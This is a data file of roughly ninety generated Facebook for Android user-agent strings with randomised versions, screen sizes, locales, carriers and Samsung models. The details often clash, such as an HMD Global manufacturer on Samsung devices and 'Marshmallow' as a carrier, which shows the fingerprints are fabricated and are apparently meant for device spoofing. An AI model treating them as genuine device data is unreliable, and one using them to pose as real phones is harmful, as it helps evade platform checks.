"[FBAN/FB4A;FBAV/225.0.0.21.127;FBBV/46501765;FBDM/{density=8.9,width=590,height=1802};FBLC/en_US;FBRV/87018941;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N980F;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/17.0.0.69.121;FBBV/65962512;FBDM/{density=9.8,width=949,height=2547};FBLC/en_GB;FBRV/62299455;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A536U;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/119.0.0.63.192;FBBV/72713267;FBDM/{density=8.3,width=640,height=2325};FBLC/en_GB;FBRV/24719910;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500W;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/57.0.0.7.17;FBBV/13448320;FBDM/{density=6.5,width=938,height=1561};FBLC/en_US;FBRV/68510627;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A716V;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/432.0.0.88.138;FBBV/38473740;FBDM/{density=5.8,width=509,height=1876};FBLC/en_US;FBRV/12630837;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A9000;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/59.0.0.28.129;FBBV/98639931;FBDM/{density=8.8,width=916,height=2840};FBLC/en_GB;FBRV/27540749;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M515F;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/86.0.0.36.23;FBBV/75045036;FBDM/{density=4.8,width=1172,height=2322};FBLC/en_PK;FBRV/27741780;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A202F;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/59.0.0.31.83;FBBV/61609900;FBDM/{density=1.3,width=1026,height=1494};FBLC/en_US;FBRV/74005086;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A025U;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/323.0.0.43.119;FBBV/17489321;FBDM/{density=5.7,width=1001,height=2848};FBLC/en_US;FBRV/86913593;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500Y;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/143.0.0.86.121;FBBV/21876878;FBDM/{density=9.2,width=633,height=2919};FBLC/en_US;FBRV/82830086;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J415FN;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/263.0.0.88.117;FBBV/24110937;FBDM/{density=8.2,width=1015,height=1297};FBLC/en_US;FBRV/78816167;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G389F;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/82.0.0.85.191;FBBV/91696629;FBDM/{density=6.4,width=825,height=1249};FBLC/en_PK;FBRV/81612470;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G600F;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/402.0.0.14.44;FBBV/36987586;FBDM/{density=4.9,width=1366,height=2450};FBLC/en_PK;FBRV/48555905;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A310F;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/217.0.0.76.21;FBBV/75033422;FBDM/{density=2.8,width=1184,height=2825};FBLC/en_GB;FBRV/94831506;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A032F;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/184.0.0.28.110;FBBV/63360089;FBDM/{density=6.1,width=1017,height=1800};FBLC/en_PK;FBRV/96718440;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N986U;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/154.0.0.93.147;FBBV/85462202;FBDM/{density=7.8,width=618,height=1403};FBLC/en_PK;FBRV/44682874;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G386T;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/161.0.0.44.93;FBBV/83132323;FBDM/{density=5.3,width=924,height=2429};FBLC/en_GB;FBRV/49708138;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G531M;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/22.0.0.81.167;FBBV/60264487;FBDM/{density=6.6,width=934,height=1333};FBLC/en_GB;FBRV/41183018;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G928F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/14.0.0.29.42;FBBV/76080170;FBDM/{density=4.2,width=892,height=2827};FBLC/en_US;FBRV/79018421;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G7810;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/103.0.0.23.83;FBBV/81751220;FBDM/{density=9.5,width=523,height=1471};FBLC/en_PK;FBRV/11690199;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G986U;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/384.0.0.4.36;FBBV/29467179;FBDM/{density=3.6,width=557,height=2900};FBLC/en_US;FBRV/21511000;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A920F;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/144.0.0.54.123;FBBV/66766939;FBDM/{density=1.9,width=753,height=1967};FBLC/en_GB;FBRV/27987347;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A505FN;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/322.0.0.4.18;FBBV/34086929;FBDM/{density=9.8,width=1283,height=2349};FBLC/en_US;FBRV/30884855;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A3051;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/38.0.0.74.136;FBBV/34503558;FBDM/{density=6.1,width=1437,height=2804};FBLC/en_PK;FBRV/74643351;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G781W;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/36.0.0.22.151;FBBV/24938783;FBDM/{density=4.3,width=1483,height=1169};FBLC/en_GB;FBRV/36478199;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J415N;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/76.0.0.72.84;FBBV/51025956;FBDM/{density=9.9,width=745,height=1032};FBLC/en_GB;FBRV/32980814;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A022M;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/76.0.0.80.157;FBBV/55663813;FBDM/{density=2.8,width=537,height=2988};FBLC/en_US;FBRV/44171450;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500L;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/309.0.0.17.86;FBBV/79879553;FBDM/{density=8.3,width=668,height=2155};FBLC/en_GB;FBRV/73546843;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N900W8;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/101.0.0.76.171;FBBV/96114281;FBDM/{density=7.2,width=1244,height=1426};FBLC/en_US;FBRV/35485645;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G530FZ;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/151.0.0.55.44;FBBV/87620671;FBDM/{density=8.2,width=1104,height=1973};FBLC/en_GB;FBRV/88163525;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A226BR;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/238.0.0.21.108;FBBV/53928340;FBDM/{density=3.1,width=965,height=1312};FBLC/en_US;FBRV/47975751;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A908N;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/60.0.0.43.135;FBBV/69680062;FBDM/{density=7.5,width=753,height=2524};FBLC/en_US;FBRV/21617825;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G920A;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/62.0.0.21.78;FBBV/38017415;FBDM/{density=9.4,width=989,height=2509};FBLC/en_US;FBRV/32162552;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J415GN;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/236.0.0.33.36;FBBV/25320543;FBDM/{density=6.1,width=779,height=2350};FBLC/en_PK;FBRV/22999443;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G970N;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/173.0.0.42.35;FBBV/79617677;FBDM/{density=6.3,width=1207,height=2387};FBLC/en_PK;FBRV/57431203;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G532M;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/184.0.0.84.60;FBBV/25471263;FBDM/{density=8.7,width=1031,height=1278};FBLC/en_US;FBRV/68417903;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737A;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/373.0.0.55.186;FBBV/66161351;FBDM/{density=5.9,width=1440,height=2273};FBLC/en_US;FBRV/33991801;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G970F;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/33.0.0.28.1;FBBV/60176900;FBDM/{density=5.2,width=942,height=1981};FBLC/en_US;FBRV/25647424;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737V;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/409.0.0.82.78;FBBV/26397294;FBDM/{density=3.3,width=726,height=2327};FBLC/en_US;FBRV/75345462;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G355M;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/346.0.0.80.13;FBBV/43937915;FBDM/{density=7.6,width=1304,height=2042};FBLC/en_PK;FBRV/69324755;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J730FM;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/332.0.0.1.118;FBBV/40401011;FBDM/{density=6.1,width=1357,height=2841};FBLC/en_US;FBRV/95887210;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G998U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/238.0.0.8.29;FBBV/35238756;FBDM/{density=2.1,width=1236,height=2438};FBLC/en_GB;FBRV/99196260;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C7108;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/35.0.0.91.131;FBBV/88968830;FBDM/{density=2.4,width=806,height=2510};FBLC/en_PK;FBRV/38493597;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C9000;FBSV/9.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/97.0.0.74.35;FBBV/33877360;FBDM/{density=1.5,width=888,height=2016};FBLC/en_GB;FBRV/16460247;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E500M;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/414.0.0.80.32;FBBV/65680868;FBDM/{density=8.6,width=1277,height=2119};FBLC/en_US;FBRV/30408837;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E700M;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/384.0.0.92.63;FBBV/77566354;FBDM/{density=6.6,width=651,height=1207};FBLC/en_GB;FBRV/97448855;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G980F;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/26.0.0.69.38;FBBV/37480092;FBDM/{density=7.6,width=804,height=2140};FBLC/en_GB;FBRV/80372784;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J327T;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/261.0.0.51.7;FBBV/90542800;FBDM/{density=9.6,width=1204,height=1435};FBLC/en_PK;FBRV/25691250;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500L;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/128.0.0.6.176;FBBV/70346680;FBDM/{density=9.7,width=717,height=1665};FBLC/en_PK;FBRV/26561896;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A530N;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/177.0.0.3.38;FBBV/86199732;FBDM/{density=4.1,width=1338,height=1228};FBLC/en_PK;FBRV/51466133;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G885Y;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/364.0.0.15.192;FBBV/13932568;FBDM/{density=4.8,width=850,height=1849};FBLC/en_GB;FBRV/12874717;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J700T1;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/401.0.0.11.12;FBBV/39228582;FBDM/{density=4.6,width=1051,height=1633};FBLC/en_PK;FBRV/12521994;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M305M;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/335.0.0.16.56;FBBV/40376792;FBDM/{density=8.7,width=693,height=2617};FBLC/en_PK;FBRV/61022305;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G960U1;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/320.0.0.9.95;FBBV/44658829;FBDM/{density=8.6,width=889,height=1662};FBLC/en_US;FBRV/45057675;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J327R4;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/339.0.0.40.95;FBBV/95035732;FBDM/{density=2.3,width=1120,height=1447};FBLC/en_PK;FBRV/80589584;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M215G;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/75.0.0.38.51;FBBV/17431072;FBDM/{density=5.4,width=1423,height=2125};FBLC/en_US;FBRV/34385931;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J415F;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/328.0.0.5.36;FBBV/36179927;FBDM/{density=5.3,width=984,height=1859};FBLC/en_GB;FBRV/44039152;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S120VL;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/157.0.0.67.158;FBBV/71786797;FBDM/{density=4.7,width=654,height=1464};FBLC/en_US;FBRV/67535167;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G965N;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/244.0.0.50.129;FBBV/57295004;FBDM/{density=3.6,width=1086,height=2770};FBLC/en_US;FBRV/67185278;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G7102;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/330.0.0.36.166;FBBV/67482640;FBDM/{density=1.3,width=744,height=2105};FBLC/en_US;FBRV/58681615;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E025F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/331.0.0.99.125;FBBV/65885638;FBDM/{density=5.3,width=1070,height=1401};FBLC/en_PK;FBRV/60588405;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A510Y;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/38.0.0.11.196;FBBV/47350268;FBDM/{density=8.1,width=1473,height=2548};FBLC/en_GB;FBRV/43901128;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A908B;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/26.0.0.33.119;FBBV/49786636;FBDM/{density=7.4,width=1376,height=1095};FBLC/en_PK;FBRV/31353923;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G920K;FBSV/9.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/399.0.0.54.121;FBBV/47348802;FBDM/{density=9.7,width=1214,height=1320};FBLC/en_US;FBRV/51275325;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A505GN;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/316.0.0.49.164;FBBV/21538855;FBDM/{density=5.1,width=1493,height=2186};FBLC/en_US;FBRV/89377904;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N920V;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/51.0.0.67.138;FBBV/97731185;FBDM/{density=1.7,width=1448,height=1076};FBLC/en_PK;FBRV/52204283;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A700H;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/238.0.0.45.174;FBBV/28079009;FBDM/{density=1.1,width=1144,height=2938};FBLC/en_GB;FBRV/48436414;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N981U;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/136.0.0.62.150;FBBV/38656420;FBDM/{density=9.6,width=947,height=1497};FBLC/en_PK;FBRV/96968514;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M526BR;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/13.0.0.26.3;FBBV/25453609;FBDM/{density=8.7,width=1184,height=2650};FBLC/en_PK;FBRV/62327601;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A9080;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/345.0.0.59.167;FBBV/14202461;FBDM/{density=8.1,width=619,height=2329};FBLC/en_PK;FBRV/92562656;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J320G;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/36.0.0.41.16;FBBV/99506497;FBDM/{density=8.9,width=607,height=1696};FBLC/en_PK;FBRV/29898790;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N916K;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/146.0.0.3.92;FBBV/88802034;FBDM/{density=8.1,width=1270,height=2899};FBLC/en_US;FBRV/96588679;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J337A;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/228.0.0.94.68;FBBV/53581209;FBDM/{density=1.9,width=1218,height=2424};FBLC/en_GB;FBRV/30597248;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N950U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/357.0.0.33.84;FBBV/86082777;FBDM/{density=8.7,width=1165,height=1543};FBLC/en_US;FBRV/17268794;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J701M;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/418.0.0.25.19;FBBV/29785096;FBDM/{density=8.4,width=976,height=2139};FBLC/en_US;FBRV/96175227;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E7009;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/225.0.0.64.2;FBBV/74815317;FBDM/{density=6.6,width=613,height=2400};FBLC/en_PK;FBRV/17546099;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N930T;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/188.0.0.25.186;FBBV/68021253;FBDM/{density=4.8,width=686,height=2758};FBLC/en_GB;FBRV/36471553;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A705MN;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/308.0.0.28.143;FBBV/25374829;FBDM/{density=8.5,width=1267,height=2487};FBLC/en_GB;FBRV/74767007;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G970U;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/140.0.0.5.31;FBBV/55569921;FBDM/{density=9.2,width=924,height=2805};FBLC/en_GB;FBRV/95263500;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C5000;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/293.0.0.58.9;FBBV/12727314;FBDM/{density=3.4,width=1481,height=1890};FBLC/en_PK;FBRV/81986326;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G5520;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/152.0.0.45.175;FBBV/59857825;FBDM/{density=9.2,width=760,height=1423};FBLC/en_US;FBRV/68723625;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A716B;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/178.0.0.90.73;FBBV/70995479;FBDM/{density=3.2,width=966,height=1868};FBLC/en_US;FBRV/36513211;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A300H;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/210.0.0.89.185;FBBV/31517206;FBDM/{density=2.3,width=1134,height=1855};FBLC/en_GB;FBRV/26625264;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G611L;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/14.0.0.29.91;FBBV/97742450;FBDM/{density=3.2,width=792,height=2587};FBLC/en_GB;FBRV/90924768;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G975U;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/60.0.0.56.161;FBBV/75729687;FBDM/{density=7.6,width=1121,height=2587};FBLC/en_PK;FBRV/11300812;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G925W8;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/429.0.0.65.156;FBBV/27321002;FBDM/{density=9.9,width=588,height=1991};FBLC/en_GB;FBRV/22775112;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G530T1;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/44.0.0.50.1;FBBV/52059266;FBDM/{density=9.8,width=1203,height=2697};FBLC/en_US;FBRV/44257026;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J700T1;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/137.0.0.89.157;FBBV/27827057;FBDM/{density=1.4,width=1325,height=2874};FBLC/en_GB;FBRV/31287984;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G901F;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/229.0.0.31.130;FBBV/89535359;FBDM/{density=2.7,width=1413,height=2906};FBLC/en_GB;FBRV/66484914;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727AZ;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/13.0.0.46.103;FBBV/91330081;FBDM/{density=1.3,width=1275,height=1690};FBLC/en_PK;FBRV/72976558;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A205U;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
